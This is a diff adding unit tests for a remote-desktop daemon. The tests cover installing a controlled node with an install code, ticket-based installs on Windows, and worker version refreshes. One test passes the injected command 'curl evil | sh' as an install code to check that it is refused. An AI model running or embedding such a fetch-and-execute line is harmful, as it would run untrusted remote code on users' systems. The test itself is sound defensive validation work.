@@ -14,6 +14,12 @@ import {
   REMOTE_DESKTOP_INSTALL_STATE,
 } from '../../shared/remote-desktop-install.js';
 import {
+  REMOTE_DESKTOP_LOGIN_SCREEN_ERROR,
+  REMOTE_DESKTOP_LOGIN_SCREEN_MSG,
+  REMOTE_DESKTOP_LOGIN_SCREEN_STATE,
+  controlledNodeInstallHereCapability,
+} from '../../shared/remote-desktop-login-screen.js';
+import {
   DaemonRemoteDesktop,
   daemonWorkerLaunchOptions,
   type DaemonRemoteDesktopDeps,
@@ -100,11 +106,76 @@ function fixture(overrides: Partial<DaemonRemoteDesktopDeps> & { installed?: boo
 }
 
 describe('DaemonRemoteDesktop', () => {
-  it('offers nothing on a platform that cannot serve remote control', () => {
+  it('on macOS, serves no remote control itself but offers to install the controlled node', () => {
     const f = fixture({ platform: 'darwin', arch: 'arm64' });
     expect(f.remoteDesktop.supported()).toBe(false);
-    expect(f.remoteDesktop.capabilities()).toEqual([]);
+    expect(f.remoteDesktop.capabilities()).toEqual([
+      controlledNodeInstallHereCapability({ os: 'mac', arch: 'universal' }),
+    ]);
     expect(f.remoteDesktop.installState()).toBe(REMOTE_DESKTOP_INSTALL_STATE.UNSUPPORTED);
+  });
+
+  it('installs the controlled node on its Linux computer with the owner\'s install code', async () => {
+    const installHere = vi.fn(async (input: { onState?: (state: 'downloading' | 'elevating') => void }) => {
+      input.onState?.('downloading');
+      input.onState?.('elevating');
+      return null;
+    });
+    const f = fixture({
+      platform: 'linux',
+      arch: 'x64',
+      installHere: installHere as unknown as DaemonRemoteDesktopDeps['installHere'],
+    });
+    expect(f.remoteDesktop.capabilities()).toEqual([
+      controlledNodeInstallHereCapability({ os: 'linux', arch: 'x64' }),
+    ]);
+
+    expect(await f.remoteDesktop.handle({
+      type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.REQUEST,
+      installCode: 'ABCDEFGHJKMN',
+    })).toBe(true);
+
+    expect(installHere).toHaveBeenCalledOnce();
+    expect(installHere.mock.calls[0]![0]).toMatchObject({ installCode: 'ABCDEFGHJKMN', platform: 'linux' });
+    expect(f.sent.filter((message) => message.type === REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE)).toEqual([
+      { type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE, state: REMOTE_DESKTOP_LOGIN_SCREEN_STATE.DOWNLOADING },
+      { type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE, state: REMOTE_DESKTOP_LOGIN_SCREEN_STATE.ELEVATING },
+      { type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE, state: REMOTE_DESKTOP_LOGIN_SCREEN_STATE.COMPLETED },
+    ]);
+  });
+
+  it('refuses an install request without a well-formed install code', async () => {
+    const installHere = vi.fn(async () => null);
+    const f = fixture({
+      platform: 'linux',
+      arch: 'x64',
+      installHere: installHere as unknown as DaemonRemoteDesktopDeps['installHere'],
+    });
+    await f.remoteDesktop.handle({
+      type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.REQUEST,
+      installCode: 'curl evil | sh',
+    });
+    expect(installHere).not.toHaveBeenCalled();
+    expect(f.sent.at(-1)).toEqual({
+      type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE,
+      state: REMOTE_DESKTOP_LOGIN_SCREEN_STATE.FAILED,
+      error: REMOTE_DESKTOP_LOGIN_SCREEN_ERROR.DOWNLOAD_FAILED,
+    });
+  });
+
+  it('keeps Windows on its own ticket install', async () => {
+    const installHere = vi.fn(async () => null);
+    const installLoginScreen = vi.fn(async () => null);
+    const f = fixture({
+      installHere: installHere as unknown as DaemonRemoteDesktopDeps['installHere'],
+      installLoginScreen: installLoginScreen as unknown as DaemonRemoteDesktopDeps['installLoginScreen'],
+    });
+    await f.remoteDesktop.handle({
+      type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.REQUEST,
+      ticket: 'ticket_abcdefghijklmnop',
+    });
+    expect(installLoginScreen).toHaveBeenCalledOnce();
+    expect(installHere).not.toHaveBeenCalled();
   });
 
   it('offers nothing on Windows arm64, which has no worker build', () => {
@@ -280,5 +351,75 @@ describe('DaemonRemoteDesktop', () => {
     expect(await f.remoteDesktop.handle({ type: REMOTE_DESKTOP_INSTALL_MSG.REQUEST })).toBe(true);
     expect(f.downloadWorker).toHaveBeenCalledTimes(1);
     expect(await f.remoteDesktop.handle({ type: 'session.send' })).toBe(false);
+  });
+
+  it('refreshes an installed worker against the independent worker release', async () => {
+    const installed = { ...artifact, manifest: { workerVersion: '2026.8.1' } } as VerifiedRemoteDesktopWorkerArtifact;
+    const latest = { ...artifact, manifest: { workerVersion: '2026.9.1' } } as VerifiedRemoteDesktopWorkerArtifact;
+    let resolveCalls = 0;
+    const f = fixture({
+      installed: true,
+      resolveArtifact: () => resolveCalls++ === 0 ? installed : latest,
+    });
+    await f.remoteDesktop.refresh();
+    expect(f.downloadWorker).toHaveBeenCalledOnce();
+    expect(f.downloadWorker.mock.calls[0]![0]).not.toHaveProperty('expectedVersion');
+    expect(f.remoteDesktop.available()).toBe(true);
+  });
+
+  it('does not replace an identical worker generation during a reconnect check', async () => {
+    const current = { ...artifact, manifest: { workerVersion: '2026.9.1' } } as VerifiedRemoteDesktopWorkerArtifact;
+    const f = fixture({
+      installed: true,
+      resolveArtifact: () => current,
+    });
+    await f.remoteDesktop.refresh();
+    expect(f.downloadWorker).toHaveBeenCalledOnce();
+    expect(f.capabilityChanges).toHaveLength(0);
+  });
+
+  it.each([
+    ['an older', '2026.7.1'],
+    ['an unknown', 'nightly'],
+  ])('keeps the installed worker when the release is %s', async (_label, targetVersion) => {
+    const installed = { ...artifact, manifest: { workerVersion: '2026.8.1' } } as VerifiedRemoteDesktopWorkerArtifact;
+    const target = { ...artifact, manifest: { workerVersion: targetVersion } } as VerifiedRemoteDesktopWorkerArtifact;
+    const launched: VerifiedRemoteDesktopWorkerArtifact[] = [];
+    const host = { handle: vi.fn(async () => true), close: vi.fn(), activeConnections: () => [] };
+    let resolveCalls = 0;
+    const f = fixture({
+      installed: true,
+      resolveArtifact: () => resolveCalls++ === 0 ? installed : target,
+      createHost: (current) => {
+        launched.push(current);
+        return host;
+      },
+    });
+
+    await f.remoteDesktop.handle(prepareCommand());
+    await f.remoteDesktop.refresh();
+
+    expect(f.downloadWorker).toHaveBeenCalledOnce();
+    expect(f.remoteDesktop.available()).toBe(true);
+    expect(f.capabilityChanges).toHaveLength(0);
+    expect(host.close).not.toHaveBeenCalled();
+    expect(launched[0]?.manifest.workerVersion).toBe('2026.8.1');
+    expect(f.sent.at(-1)).toMatchObject({
+      state: REMOTE_DESKTOP_INSTALL_STATE.FAILED,
+      error: REMOTE_DESKTOP_INSTALL_ERROR.VERIFICATION_FAILED,
+    });
+  });
+
+  it('defers an automatic refresh while a remote-desktop connection is active', async () => {
+    let active = true;
+    const older = { ...artifact, manifest: { workerVersion: '0.1.1' } } as VerifiedRemoteDesktopWorkerArtifact;
+    const host = { handle: vi.fn(async () => true), close: vi.fn(), activeConnections: () => active ? [{}] : [] };
+    const f = fixture({ installed: true, resolveArtifact: () => older, createHost: () => host });
+    await f.remoteDesktop.handle(prepareCommand());
+    await f.remoteDesktop.refresh();
+    expect(f.downloadWorker).not.toHaveBeenCalled();
+    active = false;
+    await f.remoteDesktop.handle({ type: REMOTE_DESKTOP_MSG.STOP, requestId, sessionId, capability });
+    await vi.waitFor(() => expect(f.downloadWorker).toHaveBeenCalledOnce());
   });
 });
